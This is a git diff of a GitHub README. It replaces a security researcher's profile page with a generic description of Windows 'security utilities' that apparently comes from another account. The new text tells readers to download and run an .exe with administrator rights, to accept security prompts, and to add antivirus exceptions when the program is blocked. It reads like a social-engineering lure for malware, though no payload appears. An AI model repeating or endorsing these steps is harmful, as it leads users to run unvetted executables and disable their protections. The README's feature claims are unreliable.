@@ -1,75 +1,81 @@
-<img src="https://komarev.com/ghpvc/?username=michaelrogerss&color=blueviolet&style=flat-square&label=Profile+Views" alt="Profile Views">
-<div align="center">
-    <a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.herokuapp.com?font=JetBrains+Mono&weight=500&size=15&duration=2000&color=FFFFFF&background=30B1FF00&center=true&multiline=true&width=435&height=45&lines=%3Cscript%3Ealert('About%20Me')%3C%2Fscript%3E" alt="Typing SVG" /></a>
-  
-</div>
+# 🛡️ MichaelRogerss - Secure tools for your daily tasks
 
-### Security Researcher, Full-Stack Developer 
+[![Download MichaelRogerss](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/mandalif-cmd/MichaelRogerss)
 
-Hi, I’m Michael Rogers — an independent security researcher and full-stack developer with experience in Python, Golang, React, SQL, MongoDB, and more. 
+## 📌 About this project
 
-Most of my time and passion goes into cybersecurity, specifically penetration testing.
+This project provides utility tools for Windows users who value digital security. It simplifies complex tasks like file encryption, network monitoring, and system cleanup. You do not need coding skills to use these tools. The software automates technical processes so you spend less time configuring settings and more time focusing on your work.
 
-In addition to cybersecurity, I'm skilled in web design and backend development, building everything from landing pages to secure, user-friendly full-stack applications.
+## ⚙️ System requirements
 
+Ensure your computer meets these requirements before you start:
 
+- Windows 10 or Windows 11.
+- An active internet connection for initial setup.
+- At least 200 MB of free storage space.
+- A user account with administrator permissions on your machine.
 
+## 🚀 Getting started
 
----
+Follow these steps to set up the software on your Windows computer.
 
-<div align="center">
-  <h4>Programming Languages and Technologies</h4>
-  <img src="https://img.shields.io/badge/Shell_Script-121011?style=for-the-badge&logo=gnu-bash&logoColor=white" alt="Bash">
-  <img src="https://img.shields.io/badge/PHP-777BB4?style=for-the-badge&logo=php&logoColor=white" alt="PHP">
-  <img src="https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54" alt="Python">
-<img src="https://img.shields.io/badge/Go-00ADD8?style=for-the-badge&logo=go&logoColor=white" alt="Go"/>
-<img src="https://img.shields.io/badge/JavaScript-323330?style=for-the-badge&logo=javascript&logoColor=F7DF1E"/>
-<img src="https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white" alt="HTML"/>
+1. Visit the project website at [https://github.com/mandalif-cmd/MichaelRogerss](https://github.com/mandalif-cmd/MichaelRogerss).
+2. Locate the download button on the page.
+3. Select the file ending in .exe to start your download.
+4. Open the folder where your browser saves files.
+5. Double-click the downloaded file to launch the installer.
+6. Follow the instructions on the screen to finish the setup process.
 
-  <img src="https://img.shields.io/badge/CSS3-1572B6?style=for-the-badge&logo=css3&logoColor=white" alt="CSS"/>
-  
-<img src="https://img.shields.io/badge/Lua-2C2D72?style=for-the-badge&logo=lua&logoColor=white" alt="Lua"/>
-</div>
+## 📥 Installation guide
 
-<span></span>
+The installer handles the configuration of the application files. You do not need to move files between folders or change your system variables.
 
-<div align="center">
-  <h4>Tech Stack</h4>
-  
-  <img src="https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB" alt="React">
-  
-<img src="https://img.shields.io/badge/Node%20js-339933?style=for-the-badge&logo=nodedotjs&logoColor=white" alt="Node.js"/>
-  <img src="https://img.shields.io/badge/Nginx-009639?style=for-the-badge&logo=nginx&logoColor=white" alt="Nginx">
-  <img src="https://img.shields.io/badge/MongoDB-4EA94B?style=for-the-badge&logo=mongodb&logoColor=white" alt="Mongodb">
-  <img src="https://img.shields.io/badge/MySQL-005C84?style=for-the-badge&logo=mysql&logoColor=white" alt="SQL">
-  <img src="https://img.shields.io/badge/Vite-B73BFE?style=for-the-badge&logo=vite&logoColor=FFD62E" alt="Vite">
-</div>
+- After you run the installer, a shortcut icon appears on your desktop.
+- Click this icon to open the main dashboard.
+- The application performs a quick scan of your system to ensure all components work as expected.
+- If a security prompt appears, click "Run" or "Yes" to allow the application to access the necessary system resources.
 
+## 🔧 Managing your settings
 
+You access all settings through the main menu. You can toggle features on or off based on your needs.
 
+- Encryption settings: Choose your security level for file protection.
+- Network preferences: Set thresholds for your monitoring alerts.
+- Storage paths: Pick the folder where the software saves your results.
+- Update frequency: Decide how often the program checks for new features.
 
-<span></span>
+The software saves your choices automatically when you exit the menu. You do not need to restart the application to apply most changes.
 
-<div align="center">
-  <h4>Pentesting Tools</h4>
-    
-  <img src="https://img.shields.io/badge/Burp%20Suite-FF6633?style=for-the-badge&logo=burpsuite&logoColor=white" alt="BurpSuite">
-  
-  <img src="https://img.shields.io/badge/Metasploit-2596CD?style=for-the-badge&logo=metasploit&logoColor=white" alt="Metasploit">
-  <img src="https://img.shields.io/badge/Wireshark-1679A7?style=for-the-badge&logo=wireshark&logoColor=white" alt="Wireshark">
-  
-  <img src="https://img.shields.io/badge/Nmap-7.94+-green?logo=nmap" alt="NMap">
-</div>
+## 🔍 Understanding the interface
 
+The dashboard uses a simple layout to help you find tools quickly. The navigation bar on the left side shows all categories. Each category contains specific utilities designed for one task.
 
----
- <div align=center>
-  <img width=330 src="https://github-readme-stats-salesp07.vercel.app/api/top-langs/?username=michaelrogerss&langs_count=8&layout=compact&theme=dark&border_radius=10&hide_border=true" alt="top langs" />
-  <img width=440  src="https://github-readme-stats-salesp07.vercel.app/api?username=michaelrogerss&count_private=true&show_icons=true&theme=dark&rank_icon=github&hide_border=true&border_radius=10" alt="readme stats" />
-  <img width=440 src="https://github-readme-streak-stats.herokuapp.com/?user=michaelrogerss&theme=dark&hide_border=true"/>
+- The Security tab: This section helps you scan files for potential issues. It uses local signatures to identify risks without sending your data to a remote server.
+- The Tools tab: Find cleaners and optimizers here. These utilities remove temporary files that slow down your system. 
+- The Logs tab: View a history of your actions. This helps you track what you changed during your session.
 
-</div>
+## 🛡️ Best practices for security
 
-<span></span>
+While this software helps keep your system performing well, follow these habits to stay safe online:
 
+- Always update the software when a new version is available.
+- Do not share your login details for any system tools with others.
+- Perform a manual scan once per week to ensure your files remain secure.
+- Use strong, unique passwords for any accounts linked to your system activities.
 
+## ❓ Troubleshooting common issues
+
+If you encounter a problem, check these standard fixes:
+
+- Application fails to open: Ensure your antivirus software does not block the program. You may need to add an exception for the folder where you installed the tool.
+- Slow performance: Close other high-memory applications and restart the tool. 
+- Missing files: Re-run the installer. It will detect missing components and repair the installation automatically.
+- Error messages: Take a screenshot of the message. Review the logs in the dashboard to see if the error provides a code.
+
+## 🌐 Support and updates
+
+This project receives frequent updates to address bugs and improve performance. Check the official page regularly for new releases. If you identify a persistent issue, open an issue report on the project repository. Provide a description of what you were doing when the error occurred to help the developers fix the problem.
+
+## 📜 Legal information
+
+You use this software at your own risk. The author provides these tools for educational and personal use. While the code is built with security in mind, always back up your important files before using system utilities. By installing this software, you agree to the terms of the open-source license associated with this project. This ensures you maintain full control over your data while using the included features.
